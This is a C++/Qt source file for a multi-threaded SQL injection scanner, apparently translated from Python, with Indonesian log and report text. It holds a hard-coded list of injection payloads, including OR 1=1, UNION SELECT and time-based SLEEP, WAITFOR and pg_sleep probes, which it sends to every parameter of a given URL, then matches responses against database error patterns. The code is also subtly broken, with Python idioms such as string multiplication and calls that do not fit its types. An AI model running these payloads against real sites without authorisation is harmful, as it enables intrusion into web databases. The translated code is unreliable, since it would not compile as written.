#include "sql_injection_scanner.h"
#include "http_client.h"
#include "parameter_extractor.h"
#include <QJsonDocument>
#include <QJsonObject>
#include <QJsonArray>
#include <QDateTime>
#include <QThread>
#include <QtConcurrent>
#include <QFuture>
#include <QFutureWatcher>

SQLInjectionScanner::SQLInjectionScanner(int timeout, int threads, QObject *parent)
    : QObject(parent)
    , m_timeout(timeout * 1000) // Convert to milliseconds
    , m_threads(threads)
    , m_networkManager(new QNetworkAccessManager(this))
    , m_activeRequests(0)
    , m_totalRequests(0)
    , m_completedRequests(0)
{
    // Initialize default payloads (translated from Python)
    m_payloads = {
        "'", "''", "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*",
        "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*", "') OR '1'='1--", "') OR ('1'='1--",
        "1' OR '1'='1", "1' OR 1 -- -", "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*",
        "1' UNION SELECT NULL--", "1' AND (SELECT COUNT(*) FROM users) > 0--",
        "1' AND 1=1--", "1' AND 1=2--", "'; WAITFOR DELAY '0:0:5'--",
        "'; WAITFOR DELAY '0:0:10'--", "' OR SLEEP(5)--", "' OR SLEEP(10)--",
        "1' OR SLEEP(5)--", "1' OR SLEEP(10)--", "' OR pg_sleep(5)--",
        "' OR pg_sleep(10)--", "'; SELECT pg_sleep(5)--", "'; SELECT pg_sleep(10)--"
    };
    
    // Initialize error patterns (translated from Python)
    m_errorPatterns = {
        // MySQL
        "SQL syntax.*MySQL", "Warning.*mysql_.*", "valid MySQL result", "MySqlClient\\.",
        // PostgreSQL
        "PostgreSQL.*ERROR", "Warning.*pg_.*", "valid PostgreSQL result", "Npgsql\\.",
        // MS SQL Server
        "Driver.* SQL.*Server", "OLE DB.* SQL Server", "(\\W|\\A)SQL.*Server.*Driver",
        "Warning.*mssql_.*", "(\\W|\\A)SQL.*Server.*[0-9a-fA-F]{8}",
        // Oracle
        "Exception.*Oracle", "Oracle error", "Oracle.*Driver", "Warning.*oci_.*", "Warning.*ora_.*",
        // IBM DB2
        "CLI Driver.*DB2", "DB2 SQL error", "(\\W|\\A)db2_.*",
        // SQLite
        "SQLite/JDBCDriver", "SQLite.*Driver", "Warning.*sqlite_.*", "Warning.*SQLite3::", "\\[SQLite_ERROR\\]",
        // Generic SQL
        "SQL.*Driver", "SQL.*ERROR", "SQL.*Warning", "SQL.*Exception", "error.*SQL.*syntax",
        "Unknown column", "Unknown table", "Invalid SQL", "SQL injection", "database error", "db error", "sql error"
    };
}

SQLInjectionScanner::~SQLInjectionScanner()
{
}

QJsonObject SQLInjectionScanner::scanUrl(const QString &url, const QString &method)
{
    emit logMessage(QString("Memulai scan untuk: %1").arg(url), "info");
    emit logMessage(QString("Metode: %1").arg(method), "info");
    
    m_scanTimer.start();
    
    // Extract parameters from URL
    QStringList parameters = ParameterExtractor::extractParameters(url);
    
    if (parameters.isEmpty()) {
        emit logMessage("Tidak ada parameter yang ditemukan di URL", "warning");
        QJsonObject results;
        results["url"] = url;
        results["method"] = method;
        results["parameters_tested"] = QJsonArray();
        results["vulnerable"] = false;
        return results;
    }
    
    emit logMessage(QString("Ditemukan %1 parameter: %2").arg(parameters.size()).arg(parameters.join(", ")), "info");
    
    QJsonObject results;
    results["url"] = url;
    results["method"] = method;
    results["scan_time"] = QDateTime::currentDateTime().toString("yyyy-MM-dd HH:mm:ss");
    results["parameters_tested"] = QJsonArray();
    results["vulnerable"] = false;
    results["vulnerable_parameters"] = QJsonArray();
    
    // Reset counters
    m_activeRequests = 0;
    m_totalRequests = parameters.size() * m_payloads.size();
    m_completedRequests = 0;
    
    // Test each parameter using QtConcurrent for multi-threading
    QFuture<QJsonObject> future = QtConcurrent::mapped(parameters, [this, url, method](const QString &param) {
        return QJsonObject::fromVariantMap(testParameter(url, param, method).toVariantMap());
    });
    
    QFutureWatcher<QJsonObject> watcher;
    QEventLoop loop;
    
    QObject::connect(&watcher, &QFutureWatcher<QJsonObject>::finished, &loop, &QEventLoop::quit);
    watcher.setFuture(future);
    loop.exec();
    
    // Collect results
    QJsonArray parametersTested;
    QJsonArray vulnerableParameters;
    
    for (const QJsonObject &paramResult : future.results()) {
        parametersTested.append(paramResult);
        
        if (paramResult["vulnerable"].toBool()) {
            results["vulnerable"] = true;
            vulnerableParameters.append(paramResult["parameter"].toString());
            
            QMutexLocker locker(&m_mutex);
            Vulnerability vuln;
            vuln.url = url;
            vuln.parameter = paramResult["parameter"].toString();
            vuln.method = method;
            m_vulnerabilities.append(vuln);
        }
    }
    
    results["parameters_tested"] = parametersTested;
    results["vulnerable_parameters"] = vulnerableParameters;
    
    return results;
}

ScanResult SQLInjectionScanner::testParameter(const QString &url, const QString &param, const QString &method)
{
    ScanResult result;
    result.parameter = param;
    result.vulnerable = false;
    
    HttpClient client(m_timeout);
    
    for (const QString &payload : m_payloads) {
        try {
            QString testUrl;
            QUrlQuery postData;
            
            if (method.toUpper() == "GET") {
                // Build URL with parameter for GET request
                testUrl = ParameterExtractor::buildUrlWithParameter(url, param, payload);
            } else {
                // Use original URL and add data for POST request
                testUrl = url;
                postData.addQueryItem(param, payload);
            }
            
            HttpResponse response;
            if (method.toUpper() == "GET") {
                response = client.get(testUrl, m_timeout);
            } else {
                response = client.post(testUrl, postData, m_timeout);
            }
            
            result.payloadsTested.append(payload);
            result.responseTimes.append(response.responseTime);
            
            if (response.success) {
                // Check for SQL errors in response
                QString responseText = response.body.toLower();
                
                for (const QString &pattern : m_errorPatterns) {
                    QRegularExpression regex(pattern, QRegularExpression::CaseInsensitiveOption);
                    if (regex.match(responseText).hasMatch()) {
                        QJsonObject error;
                        error["payload"] = payload;
                        error["error_pattern"] = pattern;
                        error["response_time"] = response.responseTime;
                        result.errorsFound.append(error);
                        result.vulnerable = true;
                    }
                }
                
                // Check for time-based blind SQL injection
                if (response.responseTime > 5.0) { // If response took more than 5 seconds
                    QJsonObject error;
                    error["payload"] = payload;
                    error["error_pattern"] = "Time-based blind SQL injection (response time > 5s)";
                    error["response_time"] = response.responseTime;
                    result.errorsFound.append(error);
                    result.vulnerable = true;
                }
            }
            
            // Update progress
            QMutexLocker locker(&m_mutex);
            m_completedRequests++;
            int progress = (m_completedRequests * 100) / m_totalRequests;
            emit scanProgress(progress);
            
        } catch (const std::exception &e) {
            continue; // Skip this payload and continue
        }
    }
    
    return result;
}

QString SQLInjectionScanner::generateReport(const QJsonObject &results)
{
    QStringList report;
    report.append("=" * 60);
    report.append("LAPORAN SCAN KERENTANAN SQL INJECTION");
    report.append("=" * 60);
    report.append(QString("URL: %1").arg(results["url"].toString()));
    report.append(QString("Metode: %1").arg(results["method"].toString()));
    report.append(QString("Waktu Scan: %1").arg(results["scan_time"].toString()));
    report.append("-" * 60);
    
    if (results["vulnerable"].toBool()) {
        report.append("[!] KERENTANAN DITEMUKAN!");
        
        QJsonArray vulnerableParams = results["vulnerable_parameters"].toArray();
        QStringList paramList;
        for (const QJsonValue &val : vulnerableParams) {
            paramList.append(val.toString());
        }
        report.append(QString("Parameter Rentan: %1").arg(paramList.join(", ")));
        report.append("");
        
        QJsonArray parametersTested = results["parameters_tested"].toArray();
        for (const QJsonValue &val : parametersTested) {
            QJsonObject paramResult = val.toObject();
            if (paramResult["vulnerable"].toBool()) {
                report.append(QString("Parameter: %1").arg(paramResult["parameter"].toString()));
                report.append("Status: RENTAN");
                report.append("Error yang Ditemukan:");
                
                QJsonArray errors = paramResult["errors_found"].toArray();
                for (const QJsonValue &errVal : errors) {
                    QJsonObject error = errVal.toObject();
                    report.append(QString("  - Payload: %1").arg(error["payload"].toString()));
                    report.append(QString("    Error: %1").arg(error["error_pattern"].toString()));
                    report.append(QString("    Waktu Response: %1 detik").arg(error["response_time"].toDouble()));
                }
                report.append("-" * 40);
            }
        }
    } else {
        report.append("[+] Tidak ada kerentanan SQL injection yang terdeteksi");
    }
    
    return report.join("\n");
}

bool SQLInjectionScanner::saveReport(const QJsonObject &results, const QString &filename)
{
    QString report = generateReport(results);
    QString outputFilename = filename.isEmpty() ? 
        QString("sqliscan_report_%1.txt").arg(QDateTime::currentDateTime().toSecsSinceEpoch()) : 
        filename;
    
    QFile file(outputFilename);
    if (!file.open(QIODevice::WriteOnly | QIODevice::Text)) {
        emit logMessage(QString("Gagal menyimpan laporan: %1").arg(file.errorString()), "error");
        return false;
    }
    
    QTextStream stream(&file);
    stream << report;
    file.close();
    
    emit logMessage(QString("Laporan disimpan ke: %1").arg(outputFilename), "success");
    return true;
}

QVector<SQLInjectionScanner::Vulnerability> SQLInjectionScanner::vulnerabilities() const
{
    QMutexLocker locker(&m_mutex);
    return m_vulnerabilities;
}